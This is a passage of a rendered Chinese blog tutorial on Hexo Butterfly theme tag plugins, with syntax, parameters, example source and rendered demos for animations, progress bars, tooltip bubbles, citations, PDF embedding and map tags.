class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__zoomIn,5s,5s,100,10 %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note blue &#x27;fas fa-bullhorn&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`zoomIn`动画效果，持续`5s`，延时`5s`，离底部`100`距离时启动，重复`10`次</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><p>3.slideInRight动画效果，持续5s，延时5s</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__slideInRight,5s,5s %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note orange &#x27;fas fa-car&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`slideInRight`动画效果，持续`5s`，延时`5s`。</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><p>4.heartBeat动画效果，延时5s，重复10次。此处注意不用的参数位置要留空，用逗号间隔。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__heartBeat,,5s,,10 %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note red &#x27;fas fa-battery-half&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`heartBeat`动画效果，延时`5s`，重复`10`次。</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.flip动画效果。</p><div class='wow animate__zoomIn' data-wow-duration='5s' data-wow-delay='5s' data-wow-offset='100'  data-wow-iteration='10' ><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p><code>zoomIn</code>动画效果，持续<code>5s</code>，延时<code>5s</code>，离底部<code>100</code>距离时启动，重复<code>10</code>次</p></div></div><p>2.zoomIn动画效果，持续5s，延时5s，离底部100距离时启动，重复10次</p><div class='wow animate__zoomIn' data-wow-duration='5s' data-wow-delay='5s' data-wow-offset='100'  data-wow-iteration='10' ><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p><code>zoomIn</code>动画效果，持续<code>5s</code>，延时<code>5s</code>，离底部<code>100</code>距离时启动，重复<code>10</code>次</p></div></div><p>3.slideInRight动画效果，持续5s，延时5s</p><div class='wow animate__slideInRight' data-wow-duration='5s' data-wow-delay='5s' data-wow-offset=''  data-wow-iteration='' ><div class="note orange icon-padding modern"><i class="note-icon fas fa-car"></i><p><code>slideInRight</code>动画效果，持续<code>5s</code>，延时<code>5s</code>。</p></div></div><p>4.heartBeat动画效果，延时5s，重复10次。此处注意不用的参数位置要留空，用逗号间隔。</p><div class='wow animate__heartBeat' data-wow-duration='' data-wow-delay='5s' data-wow-offset=''  data-wow-iteration='10' ><div class="note red icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p><code>heartBeat</code>动画效果，延时<code>5s</code>，重复<code>10</code>次。</p></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-25-进度条-progress">2.25  进度条 progress</h2><div class="note info flat"><p>进度条标签参考<a href="https://rongbuqiu.com/jdt.html">沂佰孜猫-给HEXO文章添加彩色进度条</a>。<br>源样式提取自<a href="https://zwying0814.gitbook.io/cuteen/">Cuteen</a>主题。</p></div><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-2">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% progress [width] [color] [text] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>width</code>: 0到100的阿拉伯数字</li><li><code>color</code>: 颜色，取值有red,yellow,green,cyan,blue,gray</li><li><code>text</code>:进度条上的文字内容</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% progress 10 red 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 30 yellow 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 50 green 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 70 cyan 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 90 blue 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 100 gray 进度条样式预览 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-red"  style="width: 10%" aria-valuenow="10" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-yellow"  style="width: 30%" aria-valuenow="30" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-green"  style="width: 50%" aria-valuenow="50" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-cyan"  style="width: 70%" aria-valuenow="70" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-blue"  style="width: 90%" aria-valuenow="90" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-gray"  style="width: 100%" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-26-注释-notation">2.26 注释 notation</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% nota [label] , [text] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><p><code>label</code>: 注释词汇</p></li><li><p><code>text</code>: 悬停显示的注解内容</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% nota 把鼠标移动到我上面试试 ,可以看到注解内容出现在顶栏 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p><span class='nota' data-nota='可以看到注解内容出现在顶栏'>把鼠标移动到我上面试试</span></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-27-气泡注释-bubble">2.27 气泡注释 bubble</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bubble [content] , [notation] ,[background-color] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>content</code>: 注释词汇</li><li><code>notation</code>: 悬停显示的注解内容</li><li><code>background-color</code>: 可选，气泡背景色。默认为“#71a4e3”</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">最近我学到了不少新玩意儿（虽然对很多大佬来说这些已经是旧技术了），比如CSS的&#123;% bubble 兄弟相邻选择器,&quot;例如 h1 + p &#123;margin-top:50px;&#125;&quot; %&#125;，&#123;% bubble flex布局,&quot;Flex 是 Flexible Box 的缩写，意为&quot;弹性布局&quot;，用来为盒状模型提供最大的灵活性&quot;,&quot;#ec5830&quot; %&#125;，&#123;% bubble transform变换,&quot;transform 属性向元素应用 2D 或 3D 转换。该属性允许我们对元素进行旋转、缩放、移动或倾斜。&quot;,&quot;#1db675&quot; %&#125;，animation的&#123;% bubble 贝塞尔速度曲线,&quot;贝塞尔曲线(Bézier curve)，又称贝兹曲线或贝济埃曲线，是应用于二维图形应用程序的数学曲线。一般的矢量图形软件通过它来精确画出曲线，贝兹曲线由线段与节点组成，节点是可拖动的支点，线段像可伸缩的皮筋&quot;,&quot;#de4489&quot; %&#125;写法，还有今天刚看到的&#123;% bubble clip-path,&quot;clip-path属性使用裁剪方式创建元素的可显示区域。区域内的部分显示，区域外的隐藏。&quot;,&quot;#868fd7&quot; %&#125;属性。这些对我来说很新颖的概念狠狠的冲击着我以前积累起来的设计思路。</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>最近我学到了不少新玩意儿（虽然对很多大佬来说这些已经是旧技术了），比如CSS的<span class="bubble-content">兄弟相邻选择器</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#71a4e3;">例如 h1 + p {margin-top:50px;}</span></span>，<span class="bubble-content">flex布局</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#ec5830;">Flex 是 Flexible Box 的缩写，意为弹性布局&quot;，用来为盒状模型提供最大的灵活性&quot;</span></span>，<span class="bubble-content">transform变换</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#1db675;">transform 属性向元素应用 2D 或 3D 转换。该属性允许我们对元素进行旋转、缩放、移动或倾斜。</span></span>，animation的<span class="bubble-content">贝塞尔速度曲线</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#de4489;">贝塞尔曲线(Bézier curve)，又称贝兹曲线或贝济埃曲线，是应用于二维图形应用程序的数学曲线。一般的矢量图形软件通过它来精确画出曲线，贝兹曲线由线段与节点组成，节点是可拖动的支点，线段像可伸缩的皮筋</span></span>写法，还有今天刚看到的<span class="bubble-content">clip-path</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#868fd7;">clip-path属性使用裁剪方式创建元素的可显示区域。区域内的部分显示，区域外的隐藏。</span></span>属性。这些对我来说很新颖的概念狠狠的冲击着我以前积累起来的设计思路。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-28-引用文献-reference">2.28 引用文献 reference</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% referto [id] , [literature] %&#125;</span><br><span class="line">&#123;% referfrom [id] , [literature] , [url] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><p>referto 引用上标</p><ul><li><p><code>id</code>: 上标序号内容，需与referfrom标签的id对应才能实现跳转</p></li><li><p><code>literature</code>: 引用的参考文献名称</p></li></ul></li><li><p>referfrom 引用出处</p><ul><li><p><code>id</code>: 序号内容，需与referto标签的id对应才能实现 跳转</p></li><li><p><code>literature</code>: 引用的参考文献名称</p></li><li><p><code>url</code>: 引用的参考文献链接，可省略</p></li></ul></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Akilarの糖果屋(akilar.top)是一个私人性质的博客&#123;% referto &#x27;[1]&#x27;,&#x27;Akilarの糖果屋群聊简介&#x27; %&#125;，从各类教程至生活点滴，无话不谈。建群的目的是提供一个闲聊的场所。博客采用Hexo框架&#123;% referto &#x27;[2]&#x27;,&#x27;Hexo中文文档&#x27; %&#125;，Butterfly主题&#123;% referto &#x27;[3]&#x27;,&#x27;Butterfly 安装文档(一) 快速开始&#x27; %&#125;</span><br><span class="line"></span><br><span class="line">本项目参考了Volantis&#123;% referto &#x27;[4]&#x27;,&#x27;hexo-theme-volantis 标签插件&#x27; %&#125;的标签样式。引入<span class="code">`[tag].js`</span>，并针对<span class="code">`butterfly`</span>主题修改了相应的<span class="code">`[tag].styl`</span>。在此鸣谢<span class="code">`Volantis`</span>主题众开发者。</span><br><span class="line">主要参考内容包括各个volantis的内置标签插件文档&#123;% referto &#x27;[5]&#x27;,&#x27;Volantis文档:内置标签插件&#x27; %&#125;</span><br><span class="line">Butterfly主题的各个衍生魔改&#123;% referto &#x27;[6]&#x27;,&#x27;Butterfly 安装文档:标签外挂（Tag Plugins&#x27; %&#125;&#123;% referto &#x27;[7]&#x27;,&#x27;小弋の生活馆全样式预览&#x27; %&#125;&#123;% referto &#x27;[8]&#x27;,&#x27;l-lin-font-awesome-animation&#x27; %&#125;&#123;% referto &#x27;[9]&#x27;,&#x27;小康的butterfly主题使用文档&#x27; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% referfrom &#x27;[1]&#x27;,&#x27;Akilarの糖果屋群聊简介&#x27;,&#x27;https://jq.qq.com/?<span class="emphasis">_wv=1027&amp;k=pGLB2C0N&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[2]&#x27;,&#x27;Hexo中文文档&#x27;,&#x27;https://hexo.io/zh-cn/docs/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[3]&#x27;,&#x27;Butterfly 安装文档(一) 快速开始&#x27;,&#x27;https://butterfly.js.org/posts/21cfbf15/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[4]&#x27;,&#x27;hexo-theme-volantis 标签插件&#x27;,&#x27;https://volantis.js.org/v5/tag-plugins/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[5]&#x27;,&#x27;Volantis文档:内置标签插件&#x27;,&#x27;https://volantis.js.org/tag-plugins/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[6]&#x27;,&#x27;Butterfly 安装文档:标签外挂（Tag Plugins&#x27;,&#x27;https://butterfly.js.org/posts/4aa8abbe/#%E6%A8%99%E7%B1%A4%E5%A4%96%E6%8E%9B%EF%BC%88Tag-Plugins%EF%BC%89&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[7]&#x27;,&#x27;小弋の生活馆全样式预览&#x27;,&#x27;https://lovelijunyi.gitee.io/posts/c898.html&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[8]&#x27;,&#x27;l-lin-font-awesome-animation&#x27;,&#x27;https://github.com/l-lin/font-awesome-animation&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[9]&#x27;,&#x27;小康的butterfly主题使用文档&#x27;,&#x27;https://www.antmoe.com/posts/3b43914f/&#x27; %&#125;</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>Akilarの糖果屋(akilar.top)是一个私人性质的博客<span class="hidden-anchor" id="referto_[1]"></span><sup class="reference"><a href="#referfrom_[1]">[1]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Akilarの糖果屋群聊简介</span><span class="reference-title">参考资料</span></span></span>，从各类教程至生活点滴，无话不谈。建群的目的是提供一个闲聊的场所。博客采用Hexo框架<span class="hidden-anchor" id="referto_[2]"></span><sup class="reference"><a href="#referfrom_[2]">[2]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Hexo中文文档</span><span class="reference-title">参考资料</span></span></span>，Butterfly主题<span class="hidden-anchor" id="referto_[3]"></span><sup class="reference"><a href="#referfrom_[3]">[3]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Butterfly 安装文档(一) 快速开始</span><span class="reference-title">参考资料</span></span></span></p><p>本项目参考了Volantis<span class="hidden-anchor" id="referto_[4]"></span><sup class="reference"><a href="#referfrom_[4]">[4]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">hexo-theme-volantis 标签插件</span><span class="reference-title">参考资料</span></span></span>的标签样式。引入<code>[tag].js</code>，并针对<code>butterfly</code>主题修改了相应的<code>[tag].styl</code>。在此鸣谢<code>Volantis</code>主题众开发者。<br>主要参考内容包括各个volantis的内置标签插件文档<span class="hidden-anchor" id="referto_[5]"></span><sup class="reference"><a href="#referfrom_[5]">[5]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Volantis文档:内置标签插件</span><span class="reference-title">参考资料</span></span></span><br>Butterfly主题的各个衍生魔改<span class="hidden-anchor" id="referto_[6]"></span><sup class="reference"><a href="#referfrom_[6]">[6]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Butterfly 安装文档:标签外挂（Tag Plugins</span><span class="reference-title">参考资料</span></span></span><span class="hidden-anchor" id="referto_[7]"></span><sup class="reference"><a href="#referfrom_[7]">[7]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">小弋の生活馆全样式预览</span><span class="reference-title">参考资料</span></span></span><span class="hidden-anchor" id="referto_[8]"></span><sup class="reference"><a href="#referfrom_[8]">[8]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">l-lin-font-awesome-animation</span><span class="reference-title">参考资料</span></span></span><span class="hidden-anchor" id="referto_[9]"></span><sup class="reference"><a href="#referfrom_[9]">[9]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">小康的butterfly主题使用文档</span><span class="reference-title">参考资料</span></span></span></p><div class="reference-source"><span class="hidden-anchor" id="referfrom_[1]"></span><a class="reference-anchor" href="#referto_[1]">[1]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://jq.qq.com/?_wv=1027&k=pGLB2C0N">Akilarの糖果屋群聊简介</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[2]"></span><a class="reference-anchor" href="#referto_[2]">[2]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://hexo.io/zh-cn/docs/">Hexo中文文档</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[3]"></span><a class="reference-anchor" href="#referto_[3]">[3]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://butterfly.js.org/posts/21cfbf15/">Butterfly 安装文档(一) 快速开始</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[4]"></span><a class="reference-anchor" href="#referto_[4]">[4]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://volantis.js.org/v5/tag-plugins/">hexo-theme-volantis 标签插件</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[5]"></span><a class="reference-anchor" href="#referto_[5]">[5]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://volantis.js.org/tag-plugins/">Volantis文档:内置标签插件</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[6]"></span><a class="reference-anchor" href="#referto_[6]">[6]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://butterfly.js.org/posts/4aa8abbe/#%E6%A8%99%E7%B1%A4%E5%A4%96%E6%8E%9B%EF%BC%88Tag-Plugins%EF%BC%89">Butterfly 安装文档:标签外挂（Tag Plugins</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[7]"></span><a class="reference-anchor" href="#referto_[7]">[7]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://lovelijunyi.gitee.io/posts/c898.html">小弋の生活馆全样式预览</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[8]"></span><a class="reference-anchor" href="#referto_[8]">[8]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://github.com/l-lin/font-awesome-animation">l-lin-font-awesome-animation</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[9]"></span><a class="reference-anchor" href="#referto_[9]">[9]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://www.antmoe.com/posts/3b43914f/">小康的butterfly主题使用文档</a></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-29-PDF展示">2.29 PDF展示</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% pdf 文件路径 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>文件路径</code>: 可以是相对路径或者是在线链接</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 1.本地文件:在md文件路径下创建一个同名文件夹，其内放pdf文件名为xxx.pdf的文件</span></span><br><span class="line">&#123;% pdf xxx.pdf %&#125;</span><br><span class="line"><span class="section"># 2.在线链接</span></span><br><span class="line">&#123;% pdf https://cdn.jsdelivr.net/gh/Justlovesmile/CDN/pdf/小作文讲义.pdf %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>2.在线链接(要放到最外层才能起作用)</p><pre><code>&lt;div class=&quot;row&quot;&gt;&lt;embed src=&quot;https://cdn.jsdelivr.net/gh/Justlovesmile/CDN/pdf/小作文讲义.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;&lt;/div&gt;</code></pre><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-30-Hexo-tag-map-插件">2.30 Hexo-tag-map 插件</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% + 标签值 + 经度 + 纬度 + 文本 + 缩放等级 + 宽 + 高 + 默认图层 + %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><table><thead><tr><th style="text-align:center">地图名</th><th style="text-align:center">标签值 &lt;必填&gt;</th><th style="text-align:center">宽 (默认 100%) / 高 (默认 360px)</th><th style="text-align:center">缩放等级 (默认 14)</th><th style="text-align:center">宽 (默认 100%) / 高 (默认 360px)</th><th style="text-align:center">默认图层 (默认 1)</th></tr></thead><tbody><tr><td style="text-align:center">混合地图</td><td style="text-align:center">map</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 3~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~7</td></tr><tr><td style="text-align:center">谷歌地图</td><td style="text-align:center">googleMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~20</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~3</td></tr><tr><td style="text-align:center">高德地图</td><td style="text-align:center">gaodeMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 3~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~3</td></tr><tr><td style="text-align:center">百度地图</td><td style="text-align:center">baiduMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 4~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~2</td></tr><tr><td style="text-align:center">Geoq 地图</td><td style="text-align:center">geoqMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~5</td></tr><tr><td style="text-align:center">openstreet 地图</td><td style="text-align:center">openstreetMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">不支持此参数</td></tr></tbody></table><ol><li>参数之间，用英文逗号相隔</li><li>参数必须按上述事例顺序输入，不得为空</li><li>同一个页面，同一组经纬度值，只能插入一个相同标签值的地图 (若有需要，可以将第二个地图上，经度或纬度末尾删除一两个数)</li><li>参数取值必须在上述范围内</li><li>默认图层：即地图叠加层的值，默认常规地图还是卫星地图，可按地图显示顺序取值</li><li>缩放等级，数字越大，地图比例尺越小，显示的越精细</li><li>除标签值外，其他参数选填，但 每个参数的左边的参数必填</li><li>谷歌地图需要外网才能加载查看</li></ol><p>坐标获取：<a href="https://lbs.amap.com/tools/picker">高德地图坐标拾取系统</a> 、<a href="https://api.map.baidu.com/lbsapi/getpoint/index.html">百度地图坐标拾取系统</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% map 120.101101,30.239119 %&#125;</span><br><span class="line">&#123;% googleMap 120.101101,30.239119, 这里是西湖灵隐寺，据说求姻缘很灵验哦！ %&#125;</span><br><span class="line">&#123;% geoqMap 120.101101,30.239119, 这里是西湖灵隐寺，据说求姻缘很灵验哦！, 13, 90%, 320px, 3 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><link rel="stylesheet" href="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.css"><script data-pjax 